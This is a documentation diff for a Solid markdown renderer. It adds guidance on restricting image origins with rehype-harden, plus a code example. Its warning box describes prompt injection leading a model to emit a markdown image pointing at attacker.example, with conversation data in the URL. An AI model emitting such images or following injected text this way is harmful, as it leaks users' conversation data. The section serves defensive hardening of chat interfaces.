@@ -5,6 +5,39 @@ description: Content trust, sanitation, and extension boundaries.
 
 Treat AI-generated Markdown as untrusted input. The current default pipeline processes raw HTML through `rehype-raw`, `rehype-sanitize` and `rehype-harden`. This differs from the initial Solid renderer, which disabled raw HTML. Sanitation uses an extended GitHub schema (including code metastrings, `tel` and the internal `streamdown` protocol, with no clobber prefix); hardening defaults allow all image/link prefixes and protocols, plus data images. The sanitation stage and default URL transform still reject executable URL schemes. This is not an origin safelist or a comprehensive security audit.
 
+> **Building an AI chat UI? Restrict image origins.** With the defaults, an image such as `![](https://attacker.example/p?d=...)` is requested by the browser as soon as the message renders, with no user action. If a model's context contains attacker-controlled text (a fetched web page, a tool result, a stored record), prompt injection can make it emit such an image with conversation data in the URL. Set `allowedImagePrefixes` to the origins you trust and `allowDataImages: false`, as shown below. Raw `<img>` tags are covered by the same `rehype-harden` setting, so you do not need to disable `rehype-raw` for this.
+
+## Restricting Images
+
+`rehype-harden` is permissive by default (all image and link prefixes, data images enabled). Replace the default rehype list to restrict image origins:
+
+```tsx
+import { Streamdown, defaultRehypePlugins } from "@blankeos/solid-streamdown";
+import { harden } from "rehype-harden";
+
+<Streamdown
+  rehypePlugins={[
+    defaultRehypePlugins.raw,
+    defaultRehypePlugins.sanitize,
+    [
+      harden,
+      {
+        // Required whenever allowedImagePrefixes or allowedLinkPrefixes is not "*"
+        defaultOrigin: "https://your-app.com",
+        allowedImagePrefixes: ["https://your-cdn.com"],
+        allowedLinkPrefixes: ["*"],
+        allowedProtocols: ["*"],
+        allowDataImages: false,
+      },
+    ],
+  ]}
+>
+  {markdown()}
+</Streamdown>;
+```
+
+Images whose URL does not start with one of the allowed prefixes are not rendered, so the browser never requests them. This applies to both Markdown images (`![](...)`) and raw `<img>` tags. `rehype-harden` throws if `allowedImagePrefixes` or `allowedLinkPrefixes` is set to anything other than `["*"]` without a `defaultOrigin`. Omitting `rehype-raw` does not restrict Markdown images.
+
 Explicit `rehypePlugins` replace defaults rather than appending. Explicit `remarkPlugins` also replace their default list. Preserve the appropriate parsing, sanitation, hardening and GFM stages when composing replacements. `allowedTags` extends the default sanitation pipeline; its behavior must not be assumed with a custom plugin list. Attribute names in `allowedTags` use HAST canonical properties, such as `dataId`, not arbitrary DOM spelling. Allowed containers do not exempt nested hostile content from sanitation.
 
 For the target default pipeline, preserve sanitation and hardening when replacing `rehypePlugins`. `allowedTags` extends tag/attribute allowances, not arbitrary script execution. `literalTagContent` controls parsing, not trust. `allowedElements`, `disallowedElements`, `allowElement` and `unwrapDisallowed` are rendering filters, not standalone HTML sanitizers.
